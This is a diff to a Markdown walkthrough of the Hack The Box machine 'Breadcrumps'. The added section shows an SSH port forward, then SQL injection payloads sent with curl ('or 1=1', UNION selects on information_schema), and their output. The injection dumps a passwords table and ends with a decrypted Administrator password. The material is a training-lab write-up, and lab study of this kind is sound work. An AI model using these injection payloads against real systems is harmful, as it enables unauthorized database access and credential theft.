@@ -9,7 +9,7 @@ menu:
     parent: htb-machines-windows
     weight: 10
 hero: images/breadcrumps.png
-tags: ["HTB"]
+tags: ["HTB", "python", "cookies", "jwt", "upload", "webshell", "defender", "tunnel", "stickynotes", "sqlite", "ghidra", "sqli", "injection", "cyberchef", "aes", "crypto"]
 ---
 
 # Breadcrumps
@@ -667,6 +667,7 @@ Krypter <key>
 
 - We can see that there is `curl` request to `http://passmanager.htb:1234/index.php`
   - Let's reconnect with `ssh` and set port forwarding with `-L 1234:127.0.01:1234` 
+    - `ssh -L 1234:127.0.0.1:1234 juliette@10.10.10.228`
 ```
 └─$ curl 'http://127.0.0.1:1234/index.php?method=select&username=administrator&table=passwords'
 selectarray(1) {
@@ -691,3 +692,112 @@ selectarray(1) {
 ```
 
 - We have a key, but we also need an encrypted password
+  - It looks like it's `SQL` query
+  - We can try `SQL Injection`
+  - Simple payload: `username=' or 1=1;-- -`
+```
+└─$ curl "http://127.0.0.1:1234/index.php" -d "method=select&username=' or 1=1;-- -&table=passwords"   
+selectarray(1) {
+  [0]=>
+  array(1) {
+    ["aes_key"]=>
+    string(16) "k19D193j.<19391("
+  }
+}
+```
+
+- So it's vulnerable
+  - Let's enumerate
+  - Single column
+```
+└─$ curl "http://127.0.0.1:1234/index.php" -d "method=select&username=' UNION select 1;-- -&table=passwords"
+selectarray(1) {
+  [0]=>
+  array(1) {
+    ["aes_key"]=>
+    string(1) "1"
+  }
+}
+```
+```
+└─$ curl "http://127.0.0.1:1234/index.php" -d "method=select&username=' UNION select 1,2;-- -&table=passwords"
+select<br />
+<b>Fatal error</b>:  Uncaught TypeError: mysqli_fetch_all(): Argument #1 ($result) must be of type mysqli_result, bool given in C:\Users\Administrator\Desktop\passwordManager\htdocs\index.php:18
+Stack trace:
+#0 C:\Users\Administrator\Desktop\passwordManager\htdocs\index.php(18): mysqli_fetch_all(false, 1)
+#1 {main}
+  thrown in <b>C:\Users\Administrator\Desktop\passwordManager\htdocs\index.php</b> on line <b>18</b><br />
+```
+
+- Check the `database`
+```
+└─$ curl "http://127.0.0.1:1234/index.php" -d "method=select&username=' UNION select database();-- -&table=passwords"
+selectarray(1) {
+  [0]=>
+  array(1) {
+    ["aes_key"]=>
+    string(5) "bread"
+  }
+}
+
+```
+```
+└─$ curl "http://127.0.0.1:1234/index.php" -d "method=select&username=' UNION select table_name from information_schema.tables where table_schema='bread';-- -&table=passwords"
+selectarray(1) {
+  [0]=>
+  array(1) {
+    ["aes_key"]=>
+    string(9) "passwords"
+  }
+}
+
+```
+```
+└─$ curl "http://127.0.0.1:1234/index.php" -d "method=select&username=' UNION select column_name from information_schema.columns where table_name='passwords';-- -&table=passwords"
+selectarray(4) {
+  [0]=>
+  array(1) {
+    ["aes_key"]=>
+    string(2) "id"
+  }
+  [1]=>
+  array(1) {
+    ["aes_key"]=>
+    string(7) "account"
+  }
+  [2]=>
+  array(1) {
+    ["aes_key"]=>
+    string(8) "password"
+  }
+  [3]=>
+  array(1) {
+    ["aes_key"]=>
+    string(7) "aes_key"
+  }
+}
+
+```
+
+- Let's dump the table
+
+```
+└─$ curl "http://127.0.0.1:1234/index.php" -d "method=select&username=' UNION select concat_ws(', ',id,account,password,aes_key) from passwords;-- -&table=passwords"
+selectarray(1) {
+  [0]=>
+  array(1) {
+    ["aes_key"]=>
+    string(80) "1, Administrator, H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw=, k19D193j.<19391("
+  }
+}
+
+```
+
+- Now we need to decrypt
+  - `Administrator:p@ssw0rd!@#$9890./`
+
+![](./images/31.png)
+
+- Now we can `ssh`
+
+![](./images/32.png)
